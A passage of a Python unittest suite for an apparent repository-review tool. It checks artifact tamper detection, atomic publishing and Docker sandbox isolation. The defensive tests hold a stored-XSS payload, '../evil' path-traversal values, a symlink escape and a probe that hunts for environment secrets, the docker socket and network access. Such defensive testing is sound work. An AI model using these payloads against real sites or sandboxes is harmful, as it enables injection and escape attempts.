            self.assertFalse(report["reproduced"])
            self.assertIn("T01 exit_code differed", report["mismatches"])

    def test_publication_rejects_cross_artifact_tampering(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        template_review = json.loads(template_path.read_text())
        owner, name = template_review["repository"].casefold().split("/", 1)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / owner / name / template_path.parent.name
            shutil.copytree(template_path.parent, artifact)
            score = json.loads((artifact / "score.json").read_text())
            original_score = copy.deepcopy(score)
            score["overall"] -= 1
            atomic_json(artifact / "score.json", score)
            fact = json.loads((artifact / "fact-check.json").read_text())
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            atomic_json(artifact / "score.json", original_score)
            replay = json.loads((artifact / "replay.json").read_text())
            replay["tests"][0]["exit_code"] = 99
            atomic_json(artifact / "replay.json", replay)
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
            replay = json.loads((artifact / "replay.json").read_text())
            replay["execution_contract_sha256"] = "0" * 64
            replay["dependency_bundle_sha256"] = "1" * 64
            replay["candidate_network"] = "bridge"
            atomic_json(artifact / "replay.json", replay)
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
            dependency = json.loads((artifact / "dependency-fetch.json").read_text())
            dependency["bundle_sha256"] = "1" * 64
            atomic_json(artifact / "dependency-fetch.json", dependency)
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            shutil.copyfile(
                template_path.parent / "dependency-fetch.json", artifact / "dependency-fetch.json"
            )
            run = json.loads((artifact / "run.json").read_text())
            replay = json.loads((artifact / "replay.json").read_text())
            for execution in (run, replay):
                execution["entrypoint"] = "different-binary"
                execution["execution_contract_sha256"] = "0" * 64
            atomic_json(artifact / "run.json", run)
            atomic_json(artifact / "replay.json", replay)
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            shutil.copyfile(template_path.parent / "run.json", artifact / "run.json")
            shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
            review = json.loads((artifact / "review.json").read_text())
            review["tests"] = [copy.deepcopy(review["tests"][0]) for _ in review["tests"]]
            review["claim_matrix"] = [
                copy.deepcopy(review["claim_matrix"][0]) for _ in review["claim_matrix"]
            ]
            atomic_json(artifact / "review.json", review)
            (artifact / "review.md").write_text(render_markdown(review))
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")

    def test_publication_rejects_repository_relabeling(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        owner, name = review["repository"].casefold().split("/", 1)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / owner / name / review["commit_sha"]
            shutil.copytree(template_path.parent, artifact)
            review["project"] = "Completely Different Product"
            atomic_json(artifact / "review.json", review)
            (artifact / "review.md").write_text(render_markdown(review))
            fact = json.loads((artifact / "fact-check.json").read_text())
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            review.update(
                {
                    "project": "fake-project",
                    "repository": "fake-owner/fake-project",
                    "repository_url": "https://github.com/fake-owner/fake-project",
                }
            )
            atomic_json(artifact / "review.json", review)
            (artifact / "review.md").write_text(render_markdown(review))
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")
            relabeled = root / "reviews" / "fake-owner" / "fake-project" / review["commit_sha"]
            relabeled.parent.mkdir(parents=True)
            artifact.rename(relabeled)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")

    def test_review_publication_is_atomic_and_never_repairs_history(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        source = template_path.parent
        review = json.loads(template_path.read_text())
        claims = [
            Claim.from_dict(item) for item in json.loads((source / "claims.json").read_text())["claims"]
        ]
        raw_plan = json.loads((source / "test-plan.json").read_text())
        plan = TestPlan.from_dict(raw_plan, claims, raw_plan["designer"])
        execution = json.loads((source / "run.json").read_text())
        raw_score = json.loads((source / "score.json").read_text())
        score = Scorecard(
            raw_score["weights"],
            raw_score["dimensions"],
            raw_score["reasons"],
            raw_score["overall"],
            Confidence(raw_score["confidence"]),
            raw_score["verdict"],
            raw_score["bullshit_ratio"],
            raw_score["bullshit_numerator"],
            raw_score["bullshit_denominator"],
            raw_score["setup_friction"],
        )
        fact = json.loads((source / "fact-check.json").read_text())
        editorial = json.loads((source / "editorial-critique.json").read_text())
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            run = root / "run"
            run.mkdir()
            for name in (
                "risk.json",
                "environment.json",
                "dependency-fetch.json",
                "checkout.json",
                "reproducibility.json",
                "replay.json",
                "editorial-critique.json",
            ):
                shutil.copyfile(source / name, run / name)
            shutil.copytree(source / "evidence", run / "evidence")
            missing = run / execution["tests"][0]["evidence"][0]
            missing.unlink()
            with self.assertRaisesRegex(ValueError, "generated review bundle is incomplete"):
                publish_review_artifacts(
                    review,
                    (source / "review.md").read_text(),
                    claims,
                    plan,
                    execution,
                    score,
                    fact,
                    editorial,
                    run,
                    root / "reviews",
                )
            owner, name = review["repository"].casefold().split("/", 1)
            unpublished = root / "reviews" / owner / name / review["commit_sha"]
            self.assertFalse(unpublished.exists())
            self.assertEqual(list(unpublished.parent.glob(f".{review['commit_sha']}.*")), [])
            shutil.copyfile(source / execution["tests"][0]["evidence"][0], missing)
            destination = publish_review_artifacts(
                review,
                (source / "review.md").read_text(),
                claims,
                plan,
                execution,
                score,
                fact,
                editorial,
                run,
                root / "reviews",
            )
            self.assertTrue(_existing_bundle_complete(destination))
            (destination / "score.json").unlink()
            with self.assertRaisesRegex(ValueError, "incomplete; refusing to rewrite"):
                publish_review_artifacts(
                    review,
                    (source / "review.md").read_text(),
                    claims,
                    plan,
                    execution,
                    score,
                    fact,
                    editorial,
                    run,
                    root / "reviews",
                )
            escape_root = root / "escape-reviews"
            outside = root / "outside"
            escape_root.mkdir()
            outside.mkdir()
            owner = review["repository"].split("/", 1)[0].casefold()
            (escape_root / owner).symlink_to(outside, target_is_directory=True)
            with self.assertRaisesRegex(ValueError, "escaped the reviews root"):
                publish_review_artifacts(
                    review,
                    (source / "review.md").read_text(),
                    claims,
                    plan,
                    execution,
                    score,
                    fact,
                    editorial,
                    run,
                    escape_root,
                )
            self.assertEqual(list(outside.iterdir()), [])

    def test_publication_requires_every_cited_evidence_file(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        owner, name = review["repository"].casefold().split("/", 1)
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / owner / name / template_path.parent.name
            shutil.copytree(template_path.parent, artifact)
            run = json.loads((artifact / "run.json").read_text())
            missing = run["tests"][0]["evidence"][0]
            (artifact / missing).unlink()
            manifest = json.loads((artifact / "evidence-manifest.json").read_text())
            atomic_json(
                artifact / "evidence-manifest.json",
                [item for item in manifest if item["path"] != missing],
            )
            fact = json.loads((artifact / "fact-check.json").read_text())
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                build_site(root / "reviews", root / "site")

    def test_staged_install_claim_stays_partial(self) -> None:
        install_claim = Claim.from_dict(
            {
                "claim_id": "CLAIM-001",
                "source": "README.md",
                "source_excerpt": "pip install tool",
                "text": "Running pip install tool installs the package.",
                "importance": "HIGH",
                "testability": "HIGH",
                "rationale": "Observable.",
            }
        )
        execution = {
            "status": "COMPLETE",
            "installation_method": "pip source install from an offline wheelhouse",
            "install_adjustments": [{"kind": "vcs_version_fallback"}],
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "evidence": ["evidence/final/T01/stdout.txt"],
                }
            ],
        }
        result = evaluate_claims(
            [install_claim], TestPlan.from_dict(plan_raw(), [install_claim], "test"), execution
        )
        self.assertEqual(result[0].status.value, "PARTIAL")

    def test_version_probe_strips_output_label(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            output = root / "version.txt"
            output.write_text("banner\nVERSION 1.2.3\n")
            execution = {"version_probe": {"exit_code": 0, "stdout_file": str(output)}}
            self.assertEqual(_observed_version(execution, root), "1.2.3")

    def test_warm_repair_requires_observed_assertions(self) -> None:
        original = TestPlan.from_dict(plan_raw(), [claim()], "initial")
        valid_raw = plan_raw()
        valid_raw["tests"][1]["expected_exit_codes"] = [0]  # type: ignore[index]
        valid_raw["tests"][1]["stderr_contains"] = ["actual error"]  # type: ignore[index]
        valid = TestPlan.from_dict(valid_raw, [claim()], "repair")
        evidence = {
            "tests": [
                {
                    "test_id": "T01",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T01/stdout.txt", "evidence/warm/T01/stderr.txt"],
                },
                {
                    "test_id": "T02",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T02/stdout.txt", "evidence/warm/T02/stderr.txt"],
                },
            ],
            "outputs": {
                "evidence/warm/T01/stdout.txt": "",
                "evidence/warm/T01/stderr.txt": "",
                "evidence/warm/T02/stdout.txt": "",
                "evidence/warm/T02/stderr.txt": "actual error",
            },
        }
        _ensure_grounded_repair(original, valid, evidence)
        weakened_raw = plan_raw()
        weakened_raw["tests"][1]["expected_exit_codes"] = [0, 2]  # type: ignore[index]
        weakened_raw["tests"][1]["stderr_contains"] = []  # type: ignore[index]
        weakened = TestPlan.from_dict(weakened_raw, [claim()], "repair")
        with self.assertRaises(ValueError):
            _ensure_grounded_repair(original, weakened, evidence)
        _ensure_grounded_strings(
            "T03",
            "stdout",
            ["function add(first,second)", "add(3,7)"],
            ["console.log(10)"],
            "console.log(10);\n",
        )
        with self.assertRaises(ValueError):
            _ensure_grounded_strings(
                "T03", "stdout", ["function add(first,second)", "add(3,7)"], ["log"], "console.log(10);\n"
            )

    def test_static_site_escapes_stored_xss(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        original_score = review["score"]["overall"]
        attack = '</title><script>alert("x")</script><img src=x onerror=alert(1)>'
        review["summary"] = attack
        claim_index = next(
            index
            for index, item in enumerate(review["claim_matrix"])
            if item["test_ids"] and "install" not in item["claim"].casefold()
        )
        review["claim_matrix"][claim_index]["claim"] = attack
        review["tests"][0]["purpose"] = attack
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            owner, name = review["repository"].casefold().split("/", 1)
            artifact = root / "reviews" / owner / name / review["commit_sha"]
            shutil.copytree(template_path.parent, artifact)
            claims = json.loads((artifact / "claims.json").read_text())
            plan = json.loads((artifact / "test-plan.json").read_text())
            claims["claims"][claim_index]["text"] = attack
            plan["tests"][0]["purpose"] = attack
            atomic_json(artifact / "claims.json", claims)
            atomic_json(artifact / "test-plan.json", plan)
            atomic_json(artifact / "review.json", review)
            (artifact / "review.md").write_text(render_markdown(review))
            fact = json.loads((artifact / "fact-check.json").read_text())
            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
            atomic_json(artifact / "fact-check.json", fact)
            site = root / "site"
            self.assertEqual(build_site(root / "reviews", site), 1)
            with self.assertRaisesRegex(ValueError, "site URL must be an HTTP.* origin"):
                build_site(
                    root / "reviews",
                    site,
                    base_path="/worthit/",
                    site_url="https://drj0e.github.io/worthit",
                )
            rendered = next((site / "reviews").rglob("index.html")).read_text()
            self.assertNotIn("<script>", rendered)
            self.assertNotIn("<img", rendered)
            self.assertIn("&lt;script&gt;", rendered)
            review["score"]["bullshit_ratio"] = None
            review["performance"]["peak_ram_bytes"] = None
            rendered = _review_page(review, "/")
            self.assertIn("Bullshit Ratio N/A", rendered)
            self.assertIn(
                "below the 200 ms sampling resolution",
                rendered,
            )
            review["score"]["overall"] = attack
            atomic_json(artifact / "review.json", review)
            with self.assertRaises(ValueError):
                build_site(root / "reviews", site)
            review["score"]["overall"] = original_score
            review["repository"] = "../evil"
            review["repository_url"] = "https://github.com/../evil"
            atomic_json(artifact / "review.json", review)
            with self.assertRaises(ValueError):
                build_site(root / "reviews", site)

    def test_correction_preserves_original_and_rejects_unsafe_evidence(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        owner, name = review["repository"].split("/")
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / owner.casefold() / name.casefold() / review["commit_sha"]
            shutil.copytree(template_path.parent, artifact)
            original = (artifact / "review.json").read_bytes()
            correction_path = (
                root / "corrections" / owner / name / review["commit_sha"] / "2026-08-14-01.json"
            )
            correction = {
                "schema_version": 1,
                "correction_id": "2026-08-14-01",
                "repository": review["repository"],
                "original_commit_sha": review["commit_sha"],
                "original_review_sha256": hashlib.sha256(original).hexdigest(),
                "published_at": "2026-08-14T12:00:00+00:00",
                "worthit_version": "0.1.0",
                "summary": "Corrected an escaped <script>alert(1)</script> statement.",
                "changes": [
                    {
                        "incorrect": "The original score explanation was too broad.",
                        "corrected": "The score applies only to the tested commit.",
                        "evidence_paths": ["score.json"],
                    }
                ],
                "rerun": {
                    "performed": False,
                    "reason": "The correction concerns wording, not execution evidence.",
                    "replacement_commit_sha": None,
                },
                "fact_checked": True,
                "editorial_approved": True,
            }
            atomic_json(correction_path, correction)
            site = root / "site"
            self.assertEqual(build_site(root / "reviews", site), 1)
            self.assertEqual((artifact / "review.json").read_bytes(), original)
            correction_page = next((site / "corrections").rglob("index.html")).read_text()
            self.assertNotIn("<script>", correction_page)
            self.assertIn("&lt;script&gt;", correction_page)
            original_page = next((site / "reviews").rglob("index.html")).read_text()
            self.assertIn("Correction notice", original_page)
            correction["changes"][0]["evidence_paths"] = ["../review.json"]
            atomic_json(correction_path, correction)
            with self.assertRaisesRegex(ValueError, "invalid correction artifact"):
                build_site(root / "reviews", site)

    def test_published_artifacts_contain_no_candidate_executables(self) -> None:
        forbidden = {".py", ".js", ".sh", ".whl", ".exe", ".bin", ".so"}
        self.assertFalse(
            [path for path in (ROOT / "reviews").rglob("*") if path.is_file() and path.suffix in forbidden]
        )


@unittest.skipUnless(
    os.environ.get("WORTHIT_DOCKER_TESTS") == "1", "set WORTHIT_DOCKER_TESTS=1 for isolation checks"
)
class DockerIsolationTests(unittest.TestCase):
    def test_disposable_container_has_no_secret_mount_or_network(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            config = RunnerConfig(allow_runc=True, test_timeout=10)
            canary = "ghp_" + "z" * 40
            os.environ["WORTHIT_TEST_CANARY"] = canary
            try:
                for track in ("python-cli", "node-cli", "go-cli"):
                    with self.subTest(track=track):
                        run_dir = (Path(temporary) / track).resolve()
                        run_dir.mkdir()
                        runner = DockerRunner(run_dir, config, TrustClass.TRUSTED, {"track": track})
                        runner.preflight()
                        sandbox = Sandbox(run_dir, config, "runc", "hostile-fixture", runner.image)
                        sandbox.start()
                        try:
                            inert = run_dir / "inert.txt"
                            inert.write_text("manifest data\n")
                            _stage_inert_file(sandbox.name, inert, "/work/inert.txt", 1000)
                            inspected = json.loads(
                                subprocess.run(
                                    ["docker", "inspect", sandbox.name],
                                    text=True,
                                    capture_output=True,
                                    timeout=10,
                                    check=True,
                                ).stdout
                            )[0]
                            self.assertEqual(inspected["Mounts"], [])
                            self.assertEqual(inspected["HostConfig"]["NetworkMode"], "none")
                            staged = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "print(open('/work/inert.txt').read(), end='')",
                                ],
                                "/work",
                                b"",
                                5,
                                run_dir / "evidence" / "staging",
                                "staging",
                            )
                            self.assertEqual((run_dir / staged.stdout_file).read_text(), "manifest data\n")
                            trace = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "import json,os,socket,sys; s=socket.socket(); s.settimeout(.2); print(json.dumps({'env':sorted(os.environ),'socket':os.path.exists('/var/run/docker.sock'),'host_home':os.path.exists(sys.argv[1]),'network':s.connect_ex(('1.1.1.1',53))}))",
                                    str(Path.home()),
                                ],
                                "/work",
                                b"",
                                5,
                                run_dir / "evidence" / "probe",
                                "probe",
                            )
                            output = (run_dir / trace.stdout_file).read_text()
                            observation = json.loads(output)
                            self.assertNotIn("WORTHIT_TEST_CANARY", observation["env"])
                            self.assertNotIn(canary, output)
                            self.assertFalse(observation["socket"])
                            self.assertFalse(observation["host_home"])
                            self.assertNotEqual(observation["network"], 0)
                            timed = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "import time; time.sleep(60)",
                                ],
                                "/work",
                                b"",
                                1,
                                run_dir / "evidence" / "timeout",
                                "timeout",
                            )
                            self.assertTrue(timed.timed_out)
                        finally:
                            sandbox.close()
                        missing = subprocess.run(
                            ["docker", "inspect", sandbox.name],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            check=False,
                        )
                        self.assertNotEqual(missing.returncode, 0)
            finally:
                os.environ.pop("WORTHIT_TEST_CANARY", None)


if __name__ == "__main__":
    unittest.main()
